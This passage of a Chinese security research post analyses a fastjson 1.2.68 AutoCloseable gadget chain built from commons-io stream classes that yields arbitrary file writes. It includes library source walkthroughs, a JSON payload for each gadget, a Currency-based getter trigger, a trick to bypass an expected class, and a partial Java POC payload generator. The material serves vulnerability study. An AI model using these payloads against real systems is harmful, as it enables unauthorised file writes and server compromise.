<p>构造方法接收参数 CharSequence 对象(s)、字符编码(charset)、字节大小(bufferSize)，并初始化放在类属性中。CharSequence 是 String 的父接口，我们使用 String 对象的数据即可。<br>由于这个类接收 CharSequence 对象，可以充当我们写入文件内容的入口类。写入的内容会放在 this.cbuf 中，这是一个 CharBuffer 对象。</p>
<p>使用如下 json 反序列化 CharSequenceInputStream 对象：</p>
<pre><code>&#123;
    &quot;charSequenceInputStream&quot;: &#123;
        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
        &quot;@type&quot;: &quot;org.apache.commons.io.input.CharSequenceInputStream&quot;,
        &quot;charset&quot;: &quot;UTF-8&quot;,
        &quot;bufferSize&quot;: 1,
        &quot;s&quot;: &#123;
            &quot;@type&quot;: &quot;java.lang.String&quot;&quot;aaa&quot;
        &#125;
    &#125;
</code></pre>
<p>需要注意的是传递<code>&quot;@type&quot;: &quot;java.lang.String&quot;&quot;aaa&quot;</code>的时候没有按照json格式化，这是因为fastjson的特性：读取 token 时采取了基于预测的方式，也就是根据当前解析情况指定下一个 token 的期望字符。<br>在处理 String 类型的反序列化器 StringCodec 中，会继续读取字符串类型的 token，并返回结果。<br><img src="/images/20230522201443.png"></p>
<h4 id="FileWriterWithEncoding"><a href="#FileWriterWithEncoding" class="headerlink" title="FileWriterWithEncoding"></a>FileWriterWithEncoding</h4><p>这个类构造方法接收 file 参数、encoding 参数，创建 File 对象，并调用 initWriter 方法初始化 OutputStreamWriter 方法放在 <code>this.out</code> 中。</p>
<pre><code>public FileWriterWithEncoding(String filename, CharsetEncoder encoding) throws IOException &#123;
    this(new File(filename), encoding, false);
&#125;

public FileWriterWithEncoding(File file, CharsetEncoder encoding, boolean append) throws IOException &#123;
    super();
    this.out = initWriter(file, encoding, append);
&#125;

 private static Writer initWriter(File file, Object encoding, boolean append) throws IOException &#123;
    if (file == null) &#123;
        throw new NullPointerException(&quot;File is missing&quot;);
    &#125;
    if (encoding == null) &#123;
        throw new NullPointerException(&quot;Encoding is missing&quot;);
    &#125;
    boolean fileExistedAlready = file.exists();
    OutputStream stream = null;
    Writer writer = null;
    try &#123;
        stream = new FileOutputStream(file, append);
        if (encoding instanceof Charset) &#123;
            writer = new OutputStreamWriter(stream, (Charset)encoding);
        &#125; else if (encoding instanceof CharsetEncoder) &#123;
            writer = new OutputStreamWriter(stream, (CharsetEncoder)encoding);
        &#125; else &#123;
            writer = new OutputStreamWriter(stream, (String)encoding);
        &#125;
    &#125; catch (IOException ex) &#123;
        IOUtils.closeQuietly(writer);
        IOUtils.closeQuietly(stream);
        if (fileExistedAlready == false) &#123;
            FileUtils.deleteQuietly(file);
        &#125;
        throw ex;
    &#125; catch (RuntimeException ex) &#123;
        IOUtils.closeQuietly(writer);
        IOUtils.closeQuietly(stream);
        if (fileExistedAlready == false) &#123;
            FileUtils.deleteQuietly(file);
        &#125;
        throw ex;
    &#125;
    return writer;
&#125;
</code></pre>
<p>使用如下 json 反序列化 writer 对象：</p>
<pre><code>&#123;
    &quot;writer&quot;: &#123;
        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
        &quot;@type&quot;: &quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;,
        &quot;file&quot;: &quot;/Users/phoebe/Downloads/1.txt&quot;,
        &quot;encoding&quot;: &quot;UTF-8&quot;
    &#125;
&#125;
</code></pre>
<h4 id="WriterOutputStream"><a href="#WriterOutputStream" class="headerlink" title="WriterOutputStream"></a>WriterOutputStream</h4><pre><code>public WriterOutputStream(Writer writer, String charsetName, int bufferSize, boolean writeImmediately) &#123;
    this(writer, Charset.forName(charsetName), bufferSize, writeImmediately);
&#125;
public WriterOutputStream(Writer writer, CharsetDecoder decoder, int bufferSize, boolean writeImmediately) &#123;
    this.writer = writer;
    this.decoder = decoder;
    this.writeImmediately = writeImmediately;
    decoderOut = CharBuffer.allocate(bufferSize);
&#125;
</code></pre>
<p>WriterOutputStream 的构造方法接收参数 Writer(writer)、字符编码(charsetName)、字节大小(bufferSize)、标识是否立即写入的布尔型参数(writeImmediately)。然后将这些参数在 WriterOutputStream 初始化。</p>
<pre><code>@Override
public void write(byte[] b, int off, int len) throws IOException &#123;
    while (len &gt; 0) &#123;
        int c = Math.min(len, decoderIn.remaining());
        decoderIn.put(b, off, c);
        processInput(false);
        len -= c;
        off += c;
    &#125;
    if (writeImmediately) &#123;
        flushOutput();
    &#125;
&#125;
</code></pre>
<p><code>write</code>方法可以将参数中的byte数组b通过 <code>this.decoderIn</code> 的 put 方法写入，使用 <code>this.processInput</code> 方法将 in 和 out 数据进行拷贝，并在 <code>this.flushOutput</code> 方法中调用 writer 的 write 方法写出 <code>this.decoderOut</code> 中的数据。</p>
<p>总结：WriterOutputStream 的 write 方法会调用 writer 将接受到的字节数据写出去。</p>
<p>使用如下 json 反序列化 WriterOutputStream 对象：</p>
<pre><code>&#123;
    &quot;writerOutputStream&quot;: &#123;
        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
        &quot;@type&quot;: &quot;org.apache.commons.io.output.WriterOutputStream&quot;,
        &quot;writeImmediately&quot;: true,
        &quot;bufferSize&quot;: 1,
        &quot;charsetName&quot;: &quot;UTF-8&quot;,
        &quot;writer&quot;: &#123;writer对象&#125;
    &#125;
&#125;
</code></pre>
<p>现在我们有了接收输入（文件内容）的 InputStream，负责输出的 OutputStream 和 Writer（文件路径），接下来我们还需要找到将 InputStream 和 OutputStream 进行转换，以及触发写出文件操作。</p>
<h4 id="TeeInputStream"><a href="#TeeInputStream" class="headerlink" title="TeeInputStream"></a>TeeInputStream</h4><p><code>org.apache.commons.io.input.TeeInputStream</code>：接收 InputStream 及 OutputStream，并提供将 InputStream 中的字节写入 OutputStream 的功能，以及提供调用两者 close 的功能。</p>
<pre><code>public TeeInputStream(
        InputStream input, OutputStream branch, boolean closeBranch) &#123;
    super(input);
    this.branch = branch;
    this.closeBranch = closeBranch;
&#125;


protected FilterInputStream(InputStream in) &#123;
    this.in = in;
&#125;
</code></pre>
<p>TeeInputStream 是 FilterInputStream 的子类，会在构造方法中会把 InputStream 放在 <code>this.in</code> 中。</p>
<p>TeeInputStream 的 <code>read</code> 方法会调用其父类 ProxyInputStream 的对应 read 方法读取 <code>this.in</code> 中的内容，并调用 <code>this.branch</code> 中的 OutputStream 对象的 write 方法进行写入。</p>
<pre><code>@Override
public int read() throws IOException &#123;
    int ch = super.read();
    if (ch != -1) &#123;
        branch.write(ch);
    &#125;
    return ch;
&#125;

@Override
public int read(byte[] bts, int st, int end) throws IOException &#123;
    int n = super.read(bts, st, end);
    if (n != -1) &#123;
        branch.write(bts, st, n);
    &#125;
    return n;
&#125;
</code></pre>
<p>使用如下 json 反序列化 TeeInputStream 对象：</p>
<pre><code>&#123;
    &quot;teeInputStream&quot;: &#123;
        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
        &quot;@type&quot;: &quot;org.apache.commons.io.input.TeeInputStream&quot;,
        &quot;input&quot;: &#123;InputStream 对象&#125;,
        &quot;branch&quot;: &#123;OutputStream 对象&#125;,
        &quot;closeBranch&quot;: true
    &#125;
&#125;
</code></pre>
<h3 id="BOMInputStream"><a href="#BOMInputStream" class="headerlink" title="BOMInputStream"></a>BOMInputStream</h3><p><code>org.apache.commons.io.input.BOMInputStream</code>：调用 InputStream 的 read 方法读取字节。</p>
<p>这个类是 commons-io 用来检测文件输入流的 BOM 并在输入流中进行过滤，根据 <code>org.apache.commons.io.ByteOrderMark</code> 中的属性。</p>
<p>BOMInputStream 与 TeeInputStream 同继承了父类 ProxyInputStream，其初始化参数 delegate 接收 InputStream，使用父类构造方法放入 <code>this.in</code> 中，boms 是 ByteOrderMark 类的可变参数数组，用来指定不同编码的 BOM 头部，会处理成 List 对象存入 <code>this.boms</code> 中。</p>
<pre><code>public BOMInputStream(InputStream delegate, boolean include, ByteOrderMark... boms) &#123;
    super(delegate);
    if (boms == null || boms.length == 0) &#123;
        throw new IllegalArgumentException(&quot;No BOMs specified&quot;);
    &#125;
    this.include = include;
    // Sort the BOMs to match the longest BOM first because some BOMs have the same starting two bytes.
    Arrays.sort(boms, ByteOrderMarkLengthComparator);
    this.boms = Arrays.asList(boms);

&#125;
</code></pre>
<p>ByteOrderMark 就是 commons-io 包对流中 BOM 头部的封装，这个类接收 charsetName 和名为 bytes 的可变参数 int 数组，这个 int 数组用来表示不同编码的字节顺序标记的表示：</p>
<pre><code>public ByteOrderMark(String charsetName, int... bytes) &#123;
    if (charsetName == null || charsetName.length() == 0) &#123;
        throw new IllegalArgumentException(&quot;No charsetName specified&quot;);
    &#125;
    if (bytes == null || bytes.length == 0) &#123;
        throw new IllegalArgumentException(&quot;No bytes specified&quot;);
    &#125;
    this.charsetName = charsetName;
    this.bytes = new int[bytes.length];
    System.arraycopy(bytes, 0, this.bytes, 0, bytes.length);
&#125;
</code></pre>
<p>BOMInputStream 中存在一个 <code>getBOM()</code> 方法，这个方法原本的作用就是根据类初始化时传入的 InputStream 对象以及 ByteOrderMark 配置，在流中读取对应的 ByteOrderMark。</p>
<pre><code>public ByteOrderMark getBOM() throws IOException &#123;
    if (firstBytes == null) &#123;
        fbLength = 0;
        // BOMs are sorted from longest to shortest
        final int maxBomSize = boms.get(0).length();
        firstBytes = new int[maxBomSize];
        // Read first maxBomSize bytes
        for (int i = 0; i &lt; firstBytes.length; i++) &#123;
            firstBytes[i] = in.read();
            fbLength++;
            if (firstBytes[i] &lt; 0) &#123;
                break;
            &#125;
        &#125;
        // match BOM in firstBytes
        byteOrderMark = find();
        if (byteOrderMark != null) &#123;
            if (!include) &#123;
                if (byteOrderMark.length() &lt; firstBytes.length) &#123;
                    fbIndex = byteOrderMark.length();
                &#125; else &#123;
                    fbLength = 0;
                &#125;
            &#125;
        &#125;
    &#125;
    return byteOrderMark;
&#125;
</code></pre>
<p>这个方法创建了一个 for 循环，根据类初始化时的 ByteOrderMark 的 int 数组长度，调用 <code>this.in</code> 的 read 方法在流中循环读取相应长度的数据。</p>
<p>使用如下 json 反序列化 BOMInputStream 对象：</p>
<pre><code>&#123;
    &quot;bOMInputStream&quot;: &#123;
        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
        &quot;@type&quot;: &quot;org.apache.commons.io.input.BOMInputStream&quot;,
        &quot;delegate&quot;: &#123;InputStream 对象&#125;,
        &quot;boms&quot;: [&#123;
            &quot;charsetName&quot;: &quot;UTF-8&quot;,
            &quot;bytes&quot;: [0, 0, 0, 0]
        &#125;]
    &#125;
&#125;
</code></pre>
<h4 id="GETTER-方法调用"><a href="#GETTER-方法调用" class="headerlink" title="GETTER 方法调用"></a>GETTER 方法调用</h4><p>这个 BOMInputStream 的 <code>getBOM</code> 方法就是触发这条 gadget 的方法，我们结合上面的全部分析一起看一下：</p>
<ul>
<li>BOMInputStream 初始化一个 TeeInputStream 和一个 ByteOrderMark 数组，里面存放了一个指定长度的 int 数组，用来读取相应长度的输入流；</li>
<li>TeeInputStream 初始化了一个 CharSequenceInputStream 和 WriterOutputStream，无论调用 TeeInputStream 的任意一个 read 方法，都会将读取的内容同步调用 WriterOutputStream 的 write 方法写入其中；</li>
<li>CharSequenceInputStream 初始化输入的字符串（实际上是 CharSequence 对象）、字符编码、以及缓冲区大小（最大 255）用于创建 InputStream 对象；</li>
<li>WriterOutputStream 初始化 FileWriterWithEncoding 以及一些属性，WriterOutputStream 的 write 方法会将字节进行写入，如果参数 writeImmediately 为 true，会调用 OutputStreamWriter 的 write 方法进行写出。</li>
</ul>
<p>以上过程使用代码正向调用的话，过程如下，可成功创建文件：</p>
<pre><code>CharSequenceInputStream inputStream    = new CharSequenceInputStream(&quot;aaaa&quot;, &quot;UTF-8&quot;, 4);
FileWriterWithEncoding  fileWriter     = new FileWriterWithEncoding(&quot;/Users/phoebe/Downloads/12.txt&quot;, &quot;UTF-8&quot;, false);
WriterOutputStream      outputStream   = new WriterOutputStream(fileWriter, &quot;UTF-8&quot;, 4, true);
TeeInputStream          teeInputStream = new TeeInputStream(inputStream, outputStream, true);
ByteOrderMark           byteOrderMark  = new ByteOrderMark(&quot;UTF-8&quot;, new int[]&#123;0, 0, 0, 0&#125;);
BOMInputStream          bomInputStream = new BOMInputStream(teeInputStream, byteOrderMark);
bomInputStream.getBOM();
bomInputStream.close();
</code></pre>
<p>getBOM作为这条链的入口，我们怎么调用这个get方法呢？</p>
<p>我们利用反序列化 Map 对象的特性。在<code>JSONObject parseObject(String text)</code>方法中，首先调用<code>parse</code>进行反序列化，然后调用<code>JSON.toJSON</code>将对象转换成<code>JSONObject</code>对象。</p>
<pre><code>public static JSONObject parseObject(String text) &#123;
    Object obj = parse(text);
    if (obj instanceof JSONObject) &#123;
        return (JSONObject) obj;
    &#125;

    try &#123;
        return (JSONObject) JSON.toJSON(obj);
    &#125; catch (RuntimeException e) &#123;
        throw new JSONException(&quot;can not cast to JSONObject.&quot;, e);
    &#125;
&#125;
</code></pre>
<p>在调用<code>JSON.toJSON</code>方法时候，当对象类型是 Map 对象时，将会调用 MapSerializer 的 <code>write</code> 方法获取 Map 中的键值对中的 value 的对象，并再次调用 <code>toJSON</code> 方法（递归自调用）。</p>
<pre><code>if (javaObject instanceof Map) &#123;
    Map&lt;Object, Object&gt; map = (Map&lt;Object, Object&gt;) javaObject;

    int size = map.size();

    Map innerMap;
    if (map instanceof LinkedHashMap) &#123;
        innerMap = new LinkedHashMap(size);
    &#125; else if (map instanceof TreeMap) &#123;
        innerMap = new TreeMap();
    &#125; else &#123;
        innerMap = new HashMap(size);
    &#125;

    JSONObject json = new JSONObject(innerMap);

    for (Map.Entry&lt;Object, Object&gt; entry : map.entrySet()) &#123;
        Object key = entry.getKey();
        String jsonKey = TypeUtils.castToString(key);
        Object jsonValue = toJSON(entry.getValue(), config);
        json.put(jsonKey, jsonValue);
    &#125;

    return json;
&#125;
</code></pre>
<p>处理这个 value 对象时，会调用 <code>javaBeanSerializer.getFieldValuesMap</code> 方法获取对象中的属性值。</p>
<pre><code>if (serializer instanceof JavaBeanSerializer) &#123;
    JavaBeanSerializer javaBeanSerializer = (JavaBeanSerializer) serializer;
    
    JSONObject json = new JSONObject();
    try &#123;
        //调用
        Map&lt;String, Object&gt; values = javaBeanSerializer.getFieldValuesMap(javaObject);
        for (Map.Entry&lt;String, Object&gt; entry : values.entrySet()) &#123;
            json.put(entry.getKey(), toJSON(entry.getValue(), config));
        &#125;
    &#125; catch (Exception e) &#123;
        throw new JSONException(&quot;toJSON error&quot;, e);
    &#125;
    return json;
&#125;
</code></pre>
<p>这个方法调用 FieldSerializer 的 <code>getPropertyValue</code> 方法来获取属性值。</p>
<p><img src="/images/20230523204654.png"></p>
<p>调用 fieldInfo 的 <code>get</code> 方法获取获取属性值。</p>
<p><img src="/images/20230523204759.png"></p>
<p>这个方法通过反射调用对象 getter 方法获取值。</p>
<p>这样就可以调用BOMInputStream 的 <code>getBOM</code> 方法，来触发后续的gadget链。</p>
<p>测试数据：</p>
<pre><code>&#123;
    &quot;@type&quot;:&quot;java.util.Map&quot;,
    &quot;aaa&quot;:&#123;
        &quot;@type&quot;:&quot;com.study.fastjson.pojo.Person&quot;,
        &quot;name&quot;:&quot;test&quot;,
        &quot;age&quot;:17
        &#125;
&#125;
</code></pre>
<p><code>parseObject</code> 方法可以调用解析，那如果使用 <code>parse</code>方法呢？</p>
<h4 id="parse-与-parseObject"><a href="#parse-与-parseObject" class="headerlink" title="parse 与 parseObject"></a>parse 与 parseObject</h4><p>fastjson 中的 <code>parse</code> 和 <code>parseObject</code> 方法都可以用来将 json 字符串反序列化成 Java 对象，<code>parseObject</code> 本质上也是调用 <code>parse</code> 进行反序列化的。但是 <code>parseObject</code> 会额外的将 Java 对象转为 JSONObject 对象，即 <code>JSON.toJSON()</code>。而在<code>JSON.toJSON()</code>中会可以利用反序列化 Map 对象的特性。自动调用value的<code>getter</code>方法，但是 <code>parse</code> 没有。</p>
<p>因此，如果想要同时兼容 <code>parse</code> 和 <code>parseObject</code> 方法，就要找到一种方法可以让其在反序列化过程中调用到 <code>JSON.toString</code> 方法。</p>
<p>在 fastjson 的反序列化过程中，会使用不同的处理器负责不同类型（class）的反序列化流程。在 <code>ParserConfig.initDeserializers()</code> 方法中定义。</p>
<p>其中有一个 MiscCodec 方法，在 fastjson 1.2.47 使用 <code>java.lang.Class</code> 缓存绕过检查时曾经遇见过，不过这次使用的类，是 <code>java.util.Currency</code>。</p>
<p>在 MiscCodec 的 deserialze 方法中，会解析 “val” 中的内容放入 objVal 中，并对其进行解析。</p>
<pre><code>if (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) &#123;
    parser.resolveStatus = DefaultJSONParser.NONE;
    parser.accept(JSONToken.COMMA);

    if (lexer.token() == JSONToken.LITERAL_STRING) &#123;
        if (!&quot;val&quot;.equals(lexer.stringVal())) &#123;
            throw new JSONException(&quot;syntax error&quot;);
        &#125;
        lexer.nextToken();
    &#125; else &#123;
        throw new JSONException(&quot;syntax error&quot;);
    &#125;

    parser.accept(JSONToken.COLON);
    //解析
    objVal = parser.parse();
    
    parser.accept(JSONToken.RBRACE);
&#125;
</code></pre>
<p>下面是解析objVal的逻辑，如果 objVal 是 JSONObject 对象，并且 @type 的 clazz 是 Currency 对象的话，会调用 JSONObject 的 getString 方法获取 key 为 currency 的值，如果值为 null 则获取 key 为 currencyCode 的值。</p>
<pre><code>if (objVal instanceof JSONObject) &#123;
    JSONObject jsonObject = (JSONObject) objVal;

    if (clazz == Currency.class) &#123;
        String currency = jsonObject.getString(&quot;currency&quot;);
        if (currency != null) &#123;
            return (T) Currency.getInstance(currency);
        &#125;

        String symbol = jsonObject.getString(&quot;currencyCode&quot;);
        if (symbol != null) &#123;
            return (T) Currency.getInstance(symbol);
        &#125;
    &#125;

    if (clazz == Map.Entry.class) &#123;
        return (T) jsonObject.entrySet().iterator().next();
    &#125;

    return jsonObject.toJavaObject(clazz);
&#125;
throw new JSONException(&quot;expect string&quot;);
</code></pre>
<p><code>getString</code>方法会调用了其 value 对象的 toString 方法，如果这个对象为 JSONObject ，那就会调用 JSONObject 的 <code>toString</code> 方法，就是 <code>JSON.toString</code>，调用 <code>toJSONString</code> 方法，如果其中是 Map 类型的数据，就可以按照之前的分析触发 getter 方法的调用。调用栈如下：</p>
<pre><code>getAddress:9, Person (com.study.fastjson.pojo)
write:-1, ASMSerializer_1_Person (com.alibaba.fastjson.serializer)
write:271, MapSerializer (com.alibaba.fastjson.serializer)
write:44, MapSerializer (com.alibaba.fastjson.serializer)
write:271, MapSerializer (com.alibaba.fastjson.serializer)
write:44, MapSerializer (com.alibaba.fastjson.serializer)
write:285, JSONSerializer (com.alibaba.fastjson.serializer)
toJSONString:973, JSON (com.alibaba.fastjson)
toString:967, JSON (com.alibaba.fastjson)
getString:325, JSONObject (com.alibaba.fastjson)
deserialze:279, MiscCodec (com.alibaba.fastjson.serializer)
parseObject:395, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1401, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1367, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:183, JSON (com.alibaba.fastjson)
parse:193, JSON (com.alibaba.fastjson)
parse:149, JSON (com.alibaba.fastjson)
main:35, FastJson_Getter_Test (com.study.fastjson.v68)
</code></pre>
<p>测试数据：</p>
<pre><code>&#123;
    &quot;@type&quot;: &quot;java.util.Currency&quot;,
    &quot;val&quot;: &#123;
        &quot;currency&quot;: &#123;
            &quot;abc&quot;: &#123;
                &quot;@type&quot;:&quot;java.util.Map&quot;,
                &quot;aaa&quot;:&#123;
                    &quot;@type&quot;:&quot;com.study.fastjson.pojo.Person&quot;,
                    &quot;name&quot;:&quot;test&quot;,
                    &quot;age&quot;:17
                &#125;
            &#125;
        &#125;
    &#125;
&#125;
</code></pre>
<p>如果不写 <code>&quot;@type&quot;: &quot;java.util.Map&quot;</code>，同样可以触发 getter&#x2F;setter 方法，因为在不使用 @type 指定类时，这种键值对的写法会被处理成 JSONObject，同样使用 MapSerializer 处理，能够进行触发。</p>
<h4 id="指定-class-对象"><a href="#指定-class-对象" class="headerlink" title="指定 class 对象"></a>指定 class 对象</h4><p>在外面嵌套一层键值，用来兼容当指定了反序列化的期待类时的情况：</p>
<p>{“test”:{payload}}</p>
<p>这是为了兼容如果 fastjson 在解析时指定了类型 <code>JSON.parseObject(json,Test.class)</code>。此时如果我们想用 <code>@type</code> 去指定类型解析，程序将会在 checkAutoType 时抛出 <code>type not match</code> 异常，我们需要在 payload 的 json 外再包裹一层来绕过。</p>
<p>绕过原因：在指定了类后，fastjson 就会直接尝试创建这个类，即使我们给他传递的 field（也就是上面的 test）指定类里没有。但是 fastjson 还是会继续处理和反序列化其中的内容。</p>
<p>但是这种情况还有一个限制，那就是需要 fastjson 指定的类有无参的构造方法，否则将可能无法创建类。</p>
<h4 id="文件写出"><a href="#文件写出" class="headerlink" title="文件写出"></a>文件写出</h4><p>如果将流中的内容写到文件中？</p>
<ol>
<li>找到触发调用 close&#x2F;flush 一类的方法</li>
<li>在缓冲区写满了之后，会触发自动写出文件内容</li>
</ol>
<p>利用方式2，WriterOutputStream 写出流内容依赖其中的 Writer 对象，在我们的调用链中，使用了 FileWriterWithEncoding 。这个方法实际上是 OutputStreamWriter 的完全封装，在创建了 FileOutputStream 后使用 OutputStreamWriter 进行封装。</p>
<pre><code> private static Writer initWriter(File file, Object encoding, boolean append) throws IOException &#123;
    if (file == null) &#123;
        throw new NullPointerException(&quot;File is missing&quot;);
    &#125;
    if (encoding == null) &#123;
        throw new NullPointerException(&quot;Encoding is missing&quot;);
    &#125;
    boolean fileExistedAlready = file.exists();
    OutputStream stream = null;
    Writer writer = null;
    try &#123;
        stream = new FileOutputStream(file, append);
        if (encoding instanceof Charset) &#123;
            writer = new OutputStreamWriter(stream, (Charset)encoding);
        &#125; else if (encoding instanceof CharsetEncoder) &#123;
            writer = new OutputStreamWriter(stream, (CharsetEncoder)encoding);
        &#125; else &#123;
            writer = new OutputStreamWriter(stream, (String)encoding);
        &#125;
    &#125;
</code></pre>
<p>OutputStreamWriter 利用了StreamEncoder，默认缓冲区大小是8192</p>
<pre><code>public OutputStreamWriter(OutputStream out, Charset cs) &#123;
    super(out);
    if (cs == null)
        throw new NullPointerException(&quot;charset&quot;);
    se = StreamEncoder.forOutputStreamWriter(out, this, cs);
&#125;

public class StreamEncoder extends Writer &#123;
    private static final int DEFAULT_BYTE_BUFFER_SIZE = 8192;
</code></pre>
<p>在执行写文件的实现方法中，会判断当前缓冲区内容管是否溢出，如果有溢出，则执行写出动作。</p>
<pre><code>void implWrite(char[] var1, int var2, int var3) throws IOException &#123;
        CharBuffer var4 = CharBuffer.wrap(var1, var2, var3);
        if (this.haveLeftoverChar) &#123;
            this.flushLeftoverChar(var4, false);
        &#125;

        while(var4.hasRemaining()) &#123;
            CoderResult var5 = this.encoder.encode(var4, this.bb, false);
            if (var5.isUnderflow()) &#123;
                assert var4.remaining() &lt;= 1 : var4.remaining();

                if (var4.remaining() == 1) &#123;
                    this.haveLeftoverChar = true;
                    this.leftoverChar = var4.get();
                &#125;
                break;
            &#125;
            //判断缓冲区溢出
            if (var5.isOverflow()) &#123;
                assert this.bb.position() &gt; 0;

                this.writeBytes();
            &#125; else &#123;
                var5.throwException();
            &#125;
        &#125;

    &#125;
</code></pre>
<h3 id="生成代码"><a href="#生成代码" class="headerlink" title="生成代码"></a>生成代码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.study.fastjson.v68;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import org.apache.commons.io.FileUtils;</span><br><span class="line"></span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line">* fastjson 1.2.68 autocloseable commons-io poc 生成工具类</span><br><span class="line">*</span><br><span class="line">*/</span><br><span class="line">public class POC &#123;</span><br><span class="line"></span><br><span class="line">    public static final String AUTOCLOSEABLE_TAG = &quot;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,&quot;;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">    * 在 payload 外包裹一层绕过指定类型</span><br><span class="line">    *</span><br><span class="line">    * @param payload payload</span><br><span class="line">    * @return 返回结果</span><br><span class="line">    */</span><br><span class="line">    public static String bypassSpecializedClass(String payload) &#123;</span><br><span class="line">        return &quot;&#123;\&quot;test\&quot;:&quot; + payload + &quot;&#125;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">    * 使用 Currency 类解析调用 &quot;currency&quot; 中 value 的 toString 方法，使用 JSONObject 方法调用 toJSONString</span><br><span class="line">    *</span><br><span class="line">    * @param payload payload</span><br><span class="line">    * @return 返回结果</span><br><span class="line">    */</span><br><span class="line">    public static String useCurrencyTriggerAllGetter(String payload, boolean ref) &#123;</span><br><span class="line">        return String.format(&quot;&#123;\&quot;@type\&quot;:\&quot;java.util.Currency\&quot;,\&quot;val\&quot;:&#123;\&quot;currency\&quot;:%s%s&#125;&#125;%s&quot;,</span><br><span class="line">                (ref ? &quot;&quot; : &quot;&#123;\&quot;text\&quot;:&quot;), payload, (ref ? &quot;&quot; : &quot;&#125;&quot;));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">    * 生成 CharSequenceInputStream 反序列化字符串</span><br><span class="line">    *</span><br><span class="line">    * @param content 写入内容</span><br><span class="line">    * @param ref     是否使用引用对象</span><br><span class="line">    * @return 返回结果</span><br><span class="line">    */</span><br><span class="line">    public static String generateCharSequenceInputStream(String content, boolean ref) &#123;</span><br><span class="line">        int mod = 8192 - content.length() % 8192;</span><br><span class="line"></span><br><span class="line">        StringBuilder contentBuilder = new StringBuilder(content);</span><br><span class="line">        for (int i = 0; i &lt; mod+1; i++) &#123;</span><br><span class="line">            contentBuilder.append(&quot; &quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return String.format(&quot;&#123;%s\&quot;@type\&quot;:\&quot;org.apache.commons.io.input.CharSequenceInputStream\&quot;,&quot; +</span><br><span class="line">                        &quot;\&quot;charset\&quot;:\&quot;UTF-8\&quot;,\&quot;bufferSize\&quot;:4,\&quot;s\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.String\&quot;\&quot;%s\&quot;&#125;&quot;,</span><br><span class="line">                ref ? AUTOCLOSEABLE_TAG : &quot;&quot;, contentBuilder);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">    * 生成 FileWriterWithEncoding 反序列化字符串</span><br><span class="line">    *</span><br><span class="line">    * @param filePath 要写入的文件位置</span><br><span class="line">    * @param ref      是否使用引用对象</span><br><span class="line">    * @return 返回结果</span><br><span class="line">    */</span><br><span class="line">    public static String generateFileWriterWithEncoding(String filePath, boolean ref) &#123;</span><br><span class="line">        return String.format(&quot;&#123;%s\&quot;@type\&quot;:\&quot;org.apache.commons.io.output.FileWriterWithEncoding\&quot;,&quot; +</span><br><span class="line">                &quot;\&quot;file\&quot;:\&quot;%s\&quot;,\&quot;encoding\&quot;:\&quot;UTF-8\&quot;&#125;&quot;, ref ? AUTOCLOSEABLE_TAG : &quot;&quot;, filePath);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">    * 生成 WriterOutputStream 反序列化字符串</span><br><span class="line">    *</span><br><span class="line">    * @param writer writer 对象反序列化字符串</span><br><span class="line">    * @param ref    是否使用引用对象</span><br><span class="line">    * @return 返回结果</span><br><span class="line">    */</span><br><span class="line">    public static String generateWriterOutputStream(String writer, boolean ref) &#123;</span><br><span class="line">        return String.format(&quot;&#123;%s\&quot;@type\&quot;:\&quot;org.apache.commons.io.output.WriterOutputStream\&quot;,\&quot;writeImmediately\&quot;:true,&quot; +</span><br><span class="line">                        &quot;\&quot;bufferSize\&quot;:4,\&quot;charsetName\&quot;:\&quot;UTF-8\&quot;,\&quot;writer\&quot;:%s&#125;&quot;,</span><br><span class="line">                ref ? AUTOCLOSEABLE_TAG : &quot;&quot;, writer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">    * 生成 TeeInputStream 反序列化字符串</span><br><span class="line">    *</span><br><span class="line">    * @param inputStream  inputStream 类</span><br><span class="line">    * @param outputStream outputStream 类</span><br><span class="line">    * @param ref          是否使用引用对象</span><br><span class="line">    * @return 返回结果</span><br><span class="line">    */</span><br><span class="line">    public static String generateTeeInputStream(String inputStream, String outputStream, boolean ref) &#123;</span><br><span class="line">        return String.format(&quot;&#123;%s\&quot;@type\&quot;:\&quot;org.apache.commons.io.input.TeeInputStream\&quot;,\&quot;input\&quot;:%s,&quot; +</span><br><span class="line">                &quot;\&quot;closeBranch\&quot;:true,\&quot;branch\&quot;:%s&#125;&quot;, ref ? AUTOCLOSEABLE_TAG : &quot;&quot;, inputStream, outputStream);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">    * 生成 BOMInputStream 反序列化字符串</span><br><span class="line">    *</span><br><span class="line">    * @param inputStream inputStream 类</span><br><span class="line">    * @param size        读取 byte 大小</span><br><span class="line">    * @return 返回结果</span><br><span class="line">    */</span><br><span class="line">    public static String generateBOMInputStream(String inputStream, int size) &#123;</span><br><span class="line"></span><br><span class="line">        int nums = size / 8192;</span><br><span class="line">        int mod  = size % 8192;</span><br><span class="line"></span><br><span class="line">        if (mod != 0) &#123;</span><br><span class="line">            nums = nums + 1;</span><br><span class="line">        